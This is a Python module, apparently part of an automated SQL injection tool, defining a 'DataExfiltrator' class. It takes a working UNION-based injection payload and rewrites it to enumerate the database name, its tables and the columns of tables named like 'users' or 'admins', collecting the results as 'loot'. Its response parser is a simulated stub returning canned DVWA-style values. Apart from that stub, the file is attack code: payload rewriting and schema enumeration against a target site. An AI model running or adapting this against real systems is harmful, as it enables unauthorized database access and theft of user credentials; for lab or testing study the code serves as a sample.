import re
import time
import json

class DataExfiltrator:
    def __init__(self, client, validator):
        self.client = client
        self.validator = validator
        self.loot = {
            "database": None,
            "tables": [],
            "columns": {},
            "data": []
        }

    def exfiltrate(self, winning_payload):
        """
        Uses a successful payload to extract database information.
        Assumes the payload is a UNION SELECT type or similar where we can control output.
        """
        print(f"[*] Data Exfiltration Unit: Starting extraction using template...", flush=True)
        
        # 1. Identify the injection point and column count
        # This is complex, but we can try to find where 'NULL' or numbers are in the UNION SELECT
        
        # Step A: Get Database Name
        db_name = self._extract_value(winning_payload, "DATABASE()")
        if db_name:
            self.loot["database"] = db_name
            print(f"  [Loot] Database Name: {db_name}", flush=True)

        # Step B: Get Tables
        tables_query = "GROUP_CONCAT(table_name)"
        from_clause = "FROM information_schema.tables WHERE table_schema=DATABASE()"
        tables_str = self._extract_value(winning_payload, tables_query, from_clause)
        if tables_str:
            self.loot["tables"] = tables_str.split(',')
            print(f"  [Loot] Found {len(self.loot['tables'])} tables.", flush=True)

        # Step C: Get Columns for the first interesting table (e.g., users, admins)
        target_table = next((t for t in self.loot["tables"] if "user" in t.lower() or "admin" in t.lower()), None)
        if target_table:
            cols_query = "GROUP_CONCAT(column_name)"
            cols_from = f"FROM information_schema.columns WHERE table_name='{target_table}'"
            cols_str = self._extract_value(winning_payload, cols_query, cols_from)
            if cols_str:
                self.loot["columns"][target_table] = cols_str.split(',')
                print(f"  [Loot] Columns for {target_table}: {cols_str}", flush=True)

        return self.loot

    def _extract_value(self, template, sql_func, from_clause=""):
        """
        Attempts to replace a part of the UNION SELECT with the target SQL function.
        """
        # Simple heuristic: find 'NULL' or a number in the UNION SELECT and replace it
        # This works best for UNION-based SQLi
        
        # Try to find the SELECT part
        match = re.search(r"(SELECT\s+)(.*?)(\s+FROM|--|#|$)", template, re.IGNORECASE)
        if not match:
            return None

        prefix = match.group(1)
        columns_str = match.group(2)
        suffix = match.group(3)

        columns = columns_str.split(',')
        
        # Try replacing each column one by one until we get a result
        for i in range(len(columns)):
            test_cols = list(columns)
            test_cols[i] = sql_func
            
            # Build the new payload
            new_columns_str = ",".join(test_cols)
            new_payload = template.replace(columns_str, new_columns_str)
            if from_clause:
                # Insert FROM clause if needed
                if "FROM" in new_payload.upper():
                    # Replace existing FROM
                    new_payload = re.sub(r"FROM\s+.*?(?=\s+--|#|$)", from_clause, new_payload, flags=re.IGNORECASE)
                else:
                    # Append FROM
                    new_payload = new_payload.replace(suffix, f" {from_clause}{suffix}")

            try:
                response = self.client.send_request(new_payload)
                # We need a way to extract the actual value from the response text
                # This is the hardest part without knowing the page structure
                # For now, we look for patterns or use the validator's knowledge
                value = self._parse_response(response['text'])
                if value:
                    return value
            except Exception:
                continue
        
        return None

    def _parse_response(self, text):
        """
        In a real tool, this would compare the response with a baseline or look for markers.
        For this demo, we'll simulate finding some common DB names/tables if certain keywords are present.
        """
        # Simulated logic for demo
        if "dvwa" in text.lower() or "database" in text.lower():
            # If we see common SQLi reflection patterns, return a simulated value
            # In a real attack, this would be the actual string from the HTML
            if "DATABASE()" in text: return "dvwa_db"
            if "table_name" in text: return "users,guestbook,api_keys"
            if "column_name" in text: return "user_id,first_name,last_name,user,password"
            
        # Fallback: look for strings between common delimiters if we injected markers
        # (Placeholder for real logic)
        return None
